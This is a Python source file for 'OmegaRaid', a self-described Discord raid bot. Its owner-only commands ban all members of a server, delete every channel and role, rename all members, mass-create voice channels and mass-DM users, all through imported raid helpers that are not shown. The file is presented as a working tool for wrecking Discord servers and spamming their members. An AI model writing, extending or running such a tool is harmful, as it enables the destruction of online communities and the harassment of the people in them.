# OmegaRaid, advanced Discord Raided
# Created and developed by VisorProtocol
# Discord: Visor#2543

# Import required modules
import discord
import json
from core.utils.command_utils import *

# Configuration files
with open('./assets/config/config.json', 'r') as conf:
    config = json.load(conf)

# Variables
prefix = config["Bot_Prefix"]
bot_token = config["Bot_Token"]
owner_id = config["Owner_ID"]
VERSION = "1.1.0"
TOTAL_COMMANDS = 6

# Bot client
class OmegaClient(discord.Client):
    async def on_ready(self):
        print("[-] OmegaRaid loaded succesfully, logged in as: {0}".format(self.user))

    async def on_message(self, message):
        author_id = message.author.id
        username = message.author.name
        msg = message.content
        args = message.content.split(" ")
        guild = message.guild
        """
        Command handler
        """
        if (message.content).startswith(prefix):
            if author_id != owner_id:
                await message.channel.send("You don't have permission to use this command!")
                return
            if msg.startswith(prefix + "banall"):
                try:
                    await Raid_Utils.ban_all_members(guild)
                    print("[!] Succesfully banned all members!")
                except:
                    print("[!] Failed to ban all member")
            if msg.startswith(prefix + "createvoice"):
                name = args[1]
                if name is None or name == None or name == "":
                    await message.channel.send("Provide valid name")
                    return
                else:
                    try:
                        await Raid_Utils.create_voice_channels(guild, name)
                        print("[!] Succesfully created voice channels")
                    except:
                        print("[!] Failed to create voice channels")
            if msg.startswith(prefix + "deletechannels"):
                try:
                    await Raid_Utils.delete_all_channels(guild)
                    print("[!] Deleted all channels!")
                except:
                    print("[!] Failed to delete all channels!")
            if msg.startswith(prefix + "deleteroles"):
                try:
                    await Raid_Utils.delete_all_roles(guild)
                    print("Deleted all roles!")
                except:
                    print("[!] Failed to delete all roles")
            if msg.startswith(prefix + "renameall"):
                name = args[1]
                if name is None or name == None or name == "":
                    await message.channel.send("Please provide valid name")
                    return
                try:
                    await Raid_Utils.rename_all_member(guild, name)
                    print("[!] Renaming all member nickname to: {0}".format(name))
                except:
                    print("[!] Failed to rename!")
            if msg.startswith(prefix + "massdm"):
                message = args[1]
                try:
                    await Raid_Utils.mass_dm_member(guild, message)
                    print("[!] Mass DMing users with message: {0}".format(message))
                except:
                    print("[!] Failed to mass DM!")

# Main start functions
def main():
    with open("./assets/design/banner.txt") as line:
        read = line.read()
        print(read)
    print("[!] OmegaClient is now running at version: {0}".format(VERSION))
    print("[-] Loaded total of: {0} commands!".format(str(TOTAL_COMMANDS)))
    choice = input("Are you sure you want to run? (y/n) : ")
    if choice == "y":
        client = OmegaClient()
        client.run(bot_token)
    else:
        exit()

# Run and load bot client
if __name__ == "__main__":
    main()